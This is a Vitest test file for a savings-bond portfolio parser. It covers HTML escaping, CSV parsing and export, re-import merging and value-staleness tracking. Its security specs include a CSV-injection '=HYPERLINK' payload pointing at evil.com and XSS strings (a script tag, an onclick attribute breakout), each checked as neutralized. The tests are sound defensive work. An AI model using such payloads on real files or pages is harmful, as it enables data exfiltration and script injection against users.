import { describe, it, expect } from 'vitest';
import {
  parseBondsFromHTML,
  parseBondsFromCSV,
  parseCSVLine,
  generateTreasuryHTML,
  generateCSV,
  escapeHTML,
  unescapeHTML,
  neutralizeCSVFormula,
  mergeImportedBonds,
  parseReportAsOf,
  parseMonthToMonths,
  formatMonthsAsMonth,
  monthsBetween,
  isValueStale,
  computePortfolioStaleness,
  formatAsOfLabel,
  getCurrentReferenceMonth,
  CURRENT_REFERENCE_DATE,
} from './bondParser';
import type { Bond } from '../types';

// One canonical fixture used by every round-trip spec. Driven by the
// spec input only; all other fields intentionally harmless so a
// failing assertion points at the round-trip logic, not at noise.
function bondWith(note: string, serial = 'R123456789I'): Bond {
  return {
    serial,
    series: 'I',
    denomination: 100,
    issueDate: '07/2010',
    nextAccrual: '08/2026',
    finalMaturity: '07/2040',
    issuePrice: 100,
    interest: 50,
    interestRate: 3.5,
    value: 150,
    note,
  };
}

// All five HTML-sensitive characters that escapeHTML handles — used as
// a self-documenting sample in the round-trip specs. Template literal
// is unambiguous: `` `<>"&'` `` is literally the 5 chars <, >, ", &, '
// (no escapes, no mixed quote styles).
const ALL_FIVE = `<>"&'`;

describe('escapeHTML (security helper)', () => {
  it('escapes a <script> tag into inert text', () => {
    expect(escapeHTML('<script>x</script>')).toBe(
      '&lt;script&gt;x&lt;/script&gt;',
    );
  });

  it('escapes each of the five HTML-sensitive characters individually', () => {
    expect(escapeHTML('&')).toBe('&amp;');
    expect(escapeHTML('<')).toBe('&lt;');
    expect(escapeHTML('>')).toBe('&gt;');
    expect(escapeHTML('"')).toBe('&quot;');
    expect(escapeHTML("'")).toBe('&#39;');
  });

  it('escapes a string with every sensitive char at once', () => {
    expect(escapeHTML(ALL_FIVE)).toBe('&lt;&gt;&quot;&amp;&#39;');
  });

  // Order matters: replace `&` FIRST, otherwise already-escaped
  // entities balloon. If someone later swapped the order in
  // escapeHTML, the assertions below (which use the LITERAL
  // expected escape, not any helper) would catch the regression.
  it('does not double-escape already-escaped entities (replaces & first)', () => {
    expect(escapeHTML('&amp;')).toBe('&amp;amp;');
    expect(escapeHTML('&lt;')).toBe('&amp;lt;');
    expect(escapeHTML('&quot;')).toBe('&amp;quot;');
  });

  it('passes empty strings and plain text through unchanged', () => {
    expect(escapeHTML('')).toBe('');
    expect(escapeHTML('hello world')).toBe('hello world');
  });

  it('coerces non-string scalars to a string before escaping', () => {
    // Numeric cells are HTML-safe by construction, but the helper
    // still works — String(100) = '100', no chars to escape.
    expect(escapeHTML(100)).toBe('100');
    expect(escapeHTML(0)).toBe('0');
    expect(escapeHTML(123.45)).toBe('123.45');
  });
});

describe('unescapeHTML (security helper)', () => {
  it('decodes the five canonical entities back to their raw characters', () => {
    expect(unescapeHTML('&lt;')).toBe('<');
    expect(unescapeHTML('&gt;')).toBe('>');
    expect(unescapeHTML('&quot;')).toBe('"');
    expect(unescapeHTML('&#39;')).toBe("'");
    expect(unescapeHTML('&amp;')).toBe('&');
  });

  // The matching ordering trap: if `&amp;` runs first, the encoded
  // sequence `&amp;lt;` would collapse to a bare `<` (because the
  // first pass decodes `&amp;` to `&`, the second pass then finds a
  // fresh `&lt;` and decodes again). The safe order decodes every
  // other entity first, then `&amp;` LAST, so `&amp;lt;` stays as
  // the literal four chars `&lt;`.
  it('decodes &amp; LAST so "&amp;lt;" becomes "&lt;" (not bare "<")', () => {
    expect(unescapeHTML('&amp;lt;')).toBe('&lt;');
    expect(unescapeHTML('&amp;quot;')).toBe('&quot;');
  });

  it('round-trips escape -> unescape for any input containing < > & " \'', () => {
    const samples = [
      '<tag>',
      'A & B',
      'she said "hi"',
      "it's fine",
      ALL_FIVE,
      'mixed: <a href="x">y & z</a>',
      '', // empty string round-trip
    ];
    for (const s of samples) {
      expect(unescapeHTML(escapeHTML(s))).toBe(s);
    }
  });
});

describe('neutralizeCSVFormula (security helper)', () => {
  // The OWASP trigger set: '=' triggers formula evaluation, '+'/'-'
  // trigger numeric coercion, '@' is an Excel function-call prefix,
  // and TAB/CR are sometimes interpreted as cell separators.
  it.each(['=', '+', '-', '@', '\t', '\r'])(
    'prefixes a single quote when value starts with "%s"',
    (trigger) => {
      expect(neutralizeCSVFormula(`${trigger}cmd`)).toBe(`'${trigger}cmd`);
    },
  );

  it('leaves values without a formula-trigger prefix unchanged', () => {
    expect(neutralizeCSVFormula('plain text')).toBe('plain text');
    expect(neutralizeCSVFormula('123.45')).toBe('123.45');
    expect(neutralizeCSVFormula('C827&41069EE')).toBe('C827&41069EE');
    expect(neutralizeCSVFormula('')).toBe('');
  });

  it('only matches at the START (mid-string = is safe)', () => {
    expect(neutralizeCSVFormula('cmd =A1+2')).toBe('cmd =A1+2');
    expect(neutralizeCSVFormula('total=42')).toBe('total=42');
  });

  it('handles the canonical OWASP exfiltration payload', () => {
    // Without neutralize, opening the CSV in Excel becomes a one-click
    // exfiltration: clicking "Click me" sends current-row data to evil.com.
    const attempt =
      '=HYPERLINK("https://evil.com/?exfil","Click me")';
    expect(neutralizeCSVFormula(attempt)).toBe(`'${attempt}`);
  });
});

// RFC-4180 single-line CSV parser. Used by parseBondsFromCSV via
// per-line split (multi-line quoted fields are out of scope — see
// the docstring on parseCSVLine).
describe('parseCSVLine (RFC-4180 quote escape)', () => {
  // Direct regression spec for the bug documented in the (now-
  // retired) FIXME block in this file. The OLD toggle-based parser
  // produced ['a', 'b'] here — it treated each `"` as a quote-modifier
  // rather than as an escaped `"`.
  it('treats `""` inside a quoted field as a single literal `"`', () => {
    expect(parseCSVLine('"a""b"')).toEqual(['a"b']);
  });

  it('handles a cell with multiple consecutive escapes', () => {
    expect(parseCSVLine('"a""b""c"')).toEqual(['a"b"c']);
  });

  it('handles empty quoted fields', () => {
    expect(parseCSVLine('""')).toEqual(['']);
    expect(parseCSVLine('"",1,""')).toEqual(['', '1', '']);
  });

  it('mixes bare and quoted cells correctly', () => {
    expect(parseCSVLine('plain,123,"quoted","with""escape"')).toEqual([
      'plain',
      '123',
      'quoted',
      'with"escape',
    ]);
  });

  it('keeps cell delimiters (commas) inside quoted cells intact', () => {
    // A comma inside a quoted field is not a separator — that's the
    // whole point of quoting per RFC 4180.
    expect(parseCSVLine('"a,b","c"')).toEqual(['a,b', 'c']);
  });
});

describe('generateTreasuryHTML — HTML export security', () => {
  it('escapes a <script> note into inert text (no live tag)', () => {
    const html = generateTreasuryHTML([
      bondWith('<script>alert("pwned")</script>'),
    ]);
    // Belt-and-braces: literal "<script" must not appear ANYWHERE in
    // the file — the only allowed form is the entity-encoded
    // &lt;script&gt; the helper emitted.
    expect(html).not.toContain('<script');
    expect(html).toContain('&lt;script&gt;');
  });

  it('escapes a value-attribute breakout attempt in `serial`', () => {
    const html = generateTreasuryHTML([
      bondWith('any', `" onclick="alert(1)`),
    ]);
    // The hostile literal must NOT appear verbatim inside any
    // attribute — the breakout is defused.
    expect(html).not.toMatch(/value="\s*"\s+onclick=/);
    expect(html).toContain('&quot; onclick=&quot;');
  });

  // Baseline for the 99% path: a plain ASCII note round-trips
  // byte-identical, no surprise double-decoding or whitespace drift.
  it('is idempotent for plain text (no-op baseline)', () => {
    const note = 'C827&41069EE';
    const html = generateTreasuryHTML([bondWith(note)]);
    expect(parseBondsFromHTML(html)[0].note).toBe(note);
  });

  // Litmus test for happy-dom's textContent entity-decoding path.
  // If happy-dom ever regresses and stops decoding entities in
  // textContent, EVERY round-trip spec in this file starts failing —
  // this spec isolates just that one char so a CI failure points
  // straight at the DOM environment.
  it('round-trips a literal "&" through entity-decode (happy-dom smoke test)', () => {
    const html = generateTreasuryHTML([bondWith('&')]);
    expect(parseBondsFromHTML(html)[0].note).toBe('&');
  });

  it('round-trips with parseBondsFromHTML: notes with HTML-special chars come back identical', () => {
    const notes = [
      '<script>x</script>',
      'A & B',
      'she said "hi"',
      "it's fine",
      ALL_FIVE,
      'mixed: <a href="x">y & z</a>',
      '', // empty-string round-trip
    ];
    for (const note of notes) {
      const html = generateTreasuryHTML([bondWith(note)]);
      const reparsed = parseBondsFromHTML(html);
      expect(reparsed.length).toBe(1);
      expect(reparsed[0].note).toBe(note);
    }
  });

  it('round-trips serials containing HTML-special chars', () => {
    const html = generateTreasuryHTML([bondWith('any', 'C827&41069EE')]);
    const reparsed = parseBondsFromHTML(html);
    expect(reparsed[0].serial).toBe('C827&41069EE');
  });
});

describe('generateCSV — CSV export security', () => {
  it('neutralizes a hostile =HYPERLINK formula note', () => {
    const csv = generateCSV([
      bondWith('=HYPERLINK("https://evil.com/?exfil","Click")'),
    ]);
    // Quote-then-'=' prefix prevents Excel/LibreOffice/Numbers from
    // evaluating the formula on open.
    expect(csv).toContain(`"'=HYPERLINK`);
    // Belt-and-braces: no bare-leading "=HYPERLINK" anywhere unquoted
    // in the CSV body.
    expect(csv).not.toMatch(/^[^"]*"=HYPERLINK/m);
  });

  it.each(['=', '+', '-', '@'])('neutralizes %s-prefixed notes', (trigger) => {
    const csv = generateCSV([bondWith(`${trigger}cmd`)]);
    expect(csv).toContain(`"'${trigger}cmd`);
  });

  it('round-trips with parseBondsFromCSV for HTML-special chars', () => {
    const notes = [
      '<script>x</script>',
      'A & B',
      "it's fine",
      '', // empty
    ];
    for (const note of notes) {
      const csv = generateCSV([bondWith(note)]);
      const reparsed = parseBondsFromCSV(csv);
      expect(reparsed.length).toBeGreaterThanOrEqual(1);
      expect(reparsed[reparsed.length - 1].note).toBe(note);
    }
  });

  // Forward-compat coverage for the parseCSVLine refactor: notes
  // containing literal `"` chars round-trip cleanly through
  // generateCSV -> parseBondsFromCSV. Would have failed before: the
  // OLD state machine couldn't distinguish `""` as escape from `""`
  // as toggles, so embedded `"` characters got silently corrupted.
  it('round-trips with parseBondsFromCSV when note contains embedded `"` chars', () => {
    const notes = [
      'she said "hi"',
      'a lone trailing quote: "',
      '""', // two literal quote chars in the data
    ];
    for (const note of notes) {
      const csv = generateCSV([bondWith(note)]);
      const reparsed = parseBondsFromCSV(csv);
      expect(reparsed.length).toBeGreaterThanOrEqual(1);
      expect(reparsed[reparsed.length - 1].note).toBe(note);
    }
  });
});

describe('mergeImportedBonds (re-import refresh)', () => {
  // Local inventory: last month's values.
  const localBond: Bond = {
    serial: 'A1',
    series: 'I',
    denomination: 100,
    issueDate: '07/2010',
    nextAccrual: '09/2026',
    finalMaturity: '07/2040',
    issuePrice: 100,
    interest: 50,
    interestRate: 3.28,
    value: 150,
    note: 'Gift from grandma',
    isCashedOut: false,
  };
  const localOnly: Bond = {
    serial: 'B2',
    series: 'EE',
    denomination: 200,
    issueDate: '01/2005',
    nextAccrual: '02/2026',
    finalMaturity: '01/2035',
    issuePrice: 100,
    interest: 75.5,
    interestRate: 3.5,
    value: 175.5,
    note: 'Local note survives',
  };
  const existing = [localBond, localOnly];

  // Fresh report: a month later — A1 accrued interest, B2 unchanged,
  // plus one brand-new bond.
  const freshA1: Bond = {
    ...localBond,
    nextAccrual: '10/2026',
    interest: 51.25,
    interestRate: 3.32,
    value: 151.25,
    note: '', // reports don't carry notes — must NOT clobber the local one
  };
  const freshB2: Bond = {
    ...localOnly,
    note: '',
  };
  const freshC3: Bond = {
    serial: 'C3',
    series: 'I',
    denomination: 500,
    issueDate: '05/2018',
    nextAccrual: '06/2026',
    finalMaturity: '05/2048',
    issuePrice: 500,
    interest: 42,
    interestRate: 2.9,
    value: 542,
    note: 'Fresh bond',
  };

  it('refreshes Interest, Rate, Value and accrual dates on serial match', () => {
    const { merged, addedCount, updatedCount, skippedCount } = mergeImportedBonds(
      [localBond],
      [freshA1],
    );
    expect(addedCount).toBe(0);
    expect(updatedCount).toBe(1);
    expect(skippedCount).toBe(0);
    expect(merged).toHaveLength(1);
    expect(merged[0]).toMatchObject({
      serial: 'A1',
      interest: 51.25,
      interestRate: 3.32,
      value: 151.25,
      nextAccrual: '10/2026',
    });
  });

  it('preserves local-only fields (note, isCashedOut) through the refresh', () => {
    const { merged } = mergeImportedBonds([localBond], [freshA1]);
    expect(merged[0].note).toBe('Gift from grandma');
    expect(merged[0].isCashedOut).toBe(false);
  });

  it('counts unchanged bonds as skipped, not updated', () => {
    const { merged, addedCount, updatedCount, skippedCount } = mergeImportedBonds(
      existing,
      [freshA1, freshB2],
    );
    expect(addedCount).toBe(0);
    expect(updatedCount).toBe(1); // only A1 changed
    expect(skippedCount).toBe(1); // B2 was already current
    expect(merged).toHaveLength(2);
    expect(merged[1]).toEqual(localOnly); // untouched — same object
  });

  it('appends new serials in import order without disturbing existing order', () => {
    const { merged, addedCount } = mergeImportedBonds(existing, [freshC3, freshA1]);
    expect(addedCount).toBe(1);
    expect(merged.map(b => b.serial)).toEqual(['A1', 'B2', 'C3']);
  });

  it('does not mutate the input arrays or bond objects', () => {
    const existingCopy = JSON.parse(JSON.stringify(existing));
    const imported = [freshA1, freshC3];
    const importedCopy = JSON.parse(JSON.stringify(imported));
    mergeImportedBonds(existing, imported);
    expect(existing).toEqual(existingCopy);
    expect(imported).toEqual(importedCopy);
  });

  it('round-trips a fresh report through generateTreasuryHTML and refreshes the portfolio', () => {
    // Simulates the real monthly flow: export last month's inventory,
    // then re-import this month's report produced from it.
    const lastMonthHTML = generateTreasuryHTML([localBond]);
    const freshReport = parseBondsFromHTML(lastMonthHTML).map(b => ({
      ...b,
      interest: b.interest + 1.25,
      value: b.value + 1.25,
    }));
    const { merged, updatedCount } = mergeImportedBonds([localBond], freshReport);
    expect(updatedCount).toBe(1);
    expect(merged[0].value).toBeCloseTo(151.25, 2);
    expect(merged[0].note).toBe('Gift from grandma'); // survived the round-trip
  });

  it('treats sub-half-cent numeric drift as unchanged (float formatting noise)', () => {
    // Same bond, but the report formats 75.5 as 75.50 parsed back as
    // 75.5 — plus a hair of float drift below half a cent.
    const drifted: Bond = { ...freshB2, interest: 75.5 + 0.004, value: 175.5 + 0.004 };
    const { updatedCount, skippedCount } = mergeImportedBonds([localOnly], [drifted]);
    expect(updatedCount).toBe(0);
    expect(skippedCount).toBe(1);
  });

  it('refreshes when a real change exceeds the half-cent tolerance', () => {
    const changed: Bond = { ...freshB2, interest: 76.01, value: 176.01 };
    const { updatedCount } = mergeImportedBonds([localOnly], [changed]);
    expect(updatedCount).toBe(1);
  });

  it('returns an empty-import result untouched (no-op)', () => {
    const { merged, addedCount, updatedCount, skippedCount } = mergeImportedBonds(existing, []);
    expect(merged).toEqual(existing);
    expect(addedCount).toBe(0);
    expect(updatedCount).toBe(0);
    expect(skippedCount).toBe(0);
  });

  it('imports into an empty inventory (first-run flow)', () => {
    const { merged, addedCount } = mergeImportedBonds([], [freshA1, freshC3]);
    expect(addedCount).toBe(2);
    expect(merged.map(b => b.serial)).toEqual(['A1', 'C3']);
  });

  it('keeps the first occurrence when the inventory already has a duplicate serial', () => {
    const duplicateA1: Bond = { ...localBond, interest: 999 };
    const { merged, updatedCount } = mergeImportedBonds([localBond, duplicateA1], [freshA1]);
    expect(updatedCount).toBe(1);
    expect(merged).toHaveLength(2);
    expect(merged[0].interest).toBe(51.25); // first occurrence refreshed
    expect(merged[1].interest).toBe(999);   // later duplicate untouched
  });

  it('reports inventory serials the fresh report no longer lists (redeemed)', () => {
    // A1 is refreshed by the report; B2 isn't mentioned at all.
    const { merged, missingFromReport } = mergeImportedBonds(existing, [freshA1]);
    expect(missingFromReport).toEqual(['B2']);
    // The merge itself keeps B2 in the inventory — callers decide
    // what to do with the missing serials (e.g. unmark cash-out).
    expect(merged.map(b => b.serial)).toEqual(['A1', 'B2']);
  });

  it('returns an empty missingFromReport when the report covers every bond', () => {
    const { missingFromReport } = mergeImportedBonds(existing, [freshA1, freshB2]);
    expect(missingFromReport).toEqual([]);
  });

  it('lists every inventory serial when the report contains only new bonds', () => {
    const { merged, missingFromReport } = mergeImportedBonds(existing, [freshC3]);
    expect(missingFromReport).toEqual(['A1', 'B2']);
    expect(merged).toHaveLength(3); // nothing removed, new one appended
  });

  it('stamps valueAsOf on added, updated, AND skipped bonds when provided', () => {
    // A1 differs (updated), B2 agrees (skipped) — both must carry the
    // report's stamp, because the fresh report confirms both as of its
    // month. C3 is brand new (added).
    const { merged, updatedCount, skippedCount, addedCount } = mergeImportedBonds(
      existing,
      [freshA1, freshB2, freshC3],
      { valueAsOf: '07/2026' },
    );
    expect(addedCount).toBe(1);
    expect(updatedCount).toBe(1);
    expect(skippedCount).toBe(1);
    expect(merged.map(b => b.valueAsOf)).toEqual(['07/2026', '07/2026', '07/2026']);
  });

  it('keeps existing stamps when the import carries no as-of option', () => {
    const stamped: Bond = { ...localBond, valueAsOf: '06/2026' };
    const { merged } = mergeImportedBonds([stamped], [freshA1]);
    expect(merged[0].valueAsOf).toBe('06/2026');
  });

  it('CSV round-trips the optional Value As Of column', () => {
    const csv = generateCSV([{ ...localBond, valueAsOf: '07/2026' }]);
    const reparsed = parseBondsFromCSV(csv);
    expect(reparsed[0].valueAsOf).toBe('07/2026');
    // 11-column legacy CSVs still parse; stamp is just absent.
    const legacyCsv = csv.split('\n').map(line => line.replace(/,"07\/2026"$/, '')).join('\n');
    expect(parseBondsFromCSV(legacyCsv)[0].valueAsOf).toBeUndefined();
  });

  it('RedemptionDate hidden input carries the freshest stamp through export', () => {
    const html = generateTreasuryHTML([
      { ...localBond, valueAsOf: '05/2026' },
      { ...localOnly, valueAsOf: '07/2026' },
    ]);
    expect(parseReportAsOf(html)).toBe('07/2026');
    // No stamps → no RedemptionDate input → parseReportAsOf stays null
    // (never a false "fresh" month).
    const noStampHtml = generateTreasuryHTML([localBond]);
    expect(parseReportAsOf(noStampHtml)).toBeNull();
  });
});

describe('value as-of helpers (staleness tracking)', () => {
  const REF = { year: 2026, month: 7 }; // pinned "now" for determinism

  // Minimal stampable fixture (independent of the merge block's
  // fixtures, which are scoped to that describe).
  const stampable: Bond = {
    serial: 'A1',
    series: 'I',
    denomination: 100,
    issueDate: '07/2010',
    nextAccrual: '09/2026',
    finalMaturity: '07/2040',
    issuePrice: 100,
    interest: 50,
    interestRate: 3.28,
    value: 150,
    note: '',
  };

  it('parseMonthToMonths / formatMonthsAsMonth round-trip and reject junk', () => {
    expect(parseMonthToMonths('07/2026')).toBe(2026 * 12 + 6);
    expect(parseMonthToMonths('00/2026')).toBeNull();
    expect(parseMonthToMonths('13/2026')).toBeNull();
    expect(parseMonthToMonths('junk')).toBeNull();
    expect(parseMonthToMonths(undefined)).toBeNull();
    const months = parseMonthToMonths('07/2026')!;
    expect(formatMonthsAsMonth(months)).toBe('07/2026');
  });

  it('monthsBetween measures whole months from a stamp to a reference', () => {
    expect(monthsBetween('07/2026', REF)).toBe(0);
    expect(monthsBetween('05/2026', REF)).toBe(2);
    expect(monthsBetween('08/2026', REF)).toBe(-1); // future stamp
    expect(monthsBetween(undefined, REF)).toBeNull();
  });

  it('isValueStale flags unknown stamps and honors the threshold', () => {
    expect(isValueStale('05/2026', 2, REF)).toBe(true);
    expect(isValueStale('06/2026', 2, REF)).toBe(false);
    expect(isValueStale('07/2026', 2, REF)).toBe(false);
    expect(isValueStale(undefined, 2, REF)).toBe(true); // unknown = stale
  });

  it('computePortfolioStaleness keys on the FRESHEST stamp', () => {
    // One fresh bond keeps the portfolio unflagged even though the
    // rest are old — the banner would otherwise be meaningless.
    const bonds = [
      { ...stampable, valueAsOf: '01/2026' },
      { ...stampable, serial: 'X2', valueAsOf: '07/2026' },
    ];
    const s = computePortfolioStaleness(bonds, 2, REF);
    expect(s.isStale).toBe(false);
    expect(s.ageInMonths).toBe(0);
    expect(s.asOfMonth).toBe('07/2026');
    expect(s.freshCount).toBe(2);
  });

  it('computePortfolioStaleness flags portfolios past the threshold', () => {
    const bonds = [
      { ...stampable, valueAsOf: '04/2026' },
      { ...stampable, serial: 'X2', valueAsOf: '05/2026' },
    ];
    const s = computePortfolioStaleness(bonds, 2, REF);
    expect(s.isStale).toBe(true);
    expect(s.ageInMonths).toBe(2);
    expect(s.asOfMonth).toBe('05/2026');
  });

  it('computePortfolioStaleness treats stampless portfolios as unknown-fresh', () => {
    const s = computePortfolioStaleness([stampable, { ...stampable, serial: 'X2' }], 2, REF);
    expect(s.isStale).toBe(false);
    expect(s.ageInMonths).toBeNull();
    expect(s.asOfMonth).toBeNull();
    expect(s.freshCount).toBe(0);
  });

  it('formatAsOfLabel renders month names and an unknown fallback', () => {
    expect(formatAsOfLabel('07/2026')).toBe('as of July 2026');
    expect(formatAsOfLabel(undefined)).toBe('value date unknown');
  });

  it('getCurrentReferenceMonth derives {year, month} from a Date', () => {
    expect(getCurrentReferenceMonth(new Date(2026, 6, 15))).toEqual({ year: 2026, month: 7 });
    expect(getCurrentReferenceMonth(new Date(2026, 11, 31))).toEqual({ year: 2026, month: 12 });
  });

  it('HTML round-trip: parseReportAsOf feeds mergeImportedBonds stamping', () => {
    // Simulates the full monthly flow: a report saved for July 2026,
    // re-imported against an inventory stamped June 2026.
    const reportHTML = generateTreasuryHTML([
      { ...stampable, valueAsOf: '07/2026', interest: 52.5, value: 152.5 },
    ]);
    const asOf = parseReportAsOf(reportHTML);
    expect(asOf).toBe('07/2026');
    const imported = parseBondsFromHTML(reportHTML);
    const { merged, updatedCount } = mergeImportedBonds(
      [{ ...stampable, valueAsOf: '06/2026' }],
      imported,
      { valueAsOf: asOf ?? undefined },
    );
    expect(updatedCount).toBe(1);
    expect(merged[0].valueAsOf).toBe('07/2026');
    expect(merged[0].value).toBe(152.5);
  });
});

describe('CURRENT_REFERENCE_DATE (dashboard reference date)', () => {
  it('is exported and shaped for isBondMatured consumption', () => {
    expect(CURRENT_REFERENCE_DATE).toEqual({ year: 2026, month: 7 });
    expect(typeof CURRENT_REFERENCE_DATE.year).toBe('number');
    expect(typeof CURRENT_REFERENCE_DATE.month).toBe('number');
  });
});
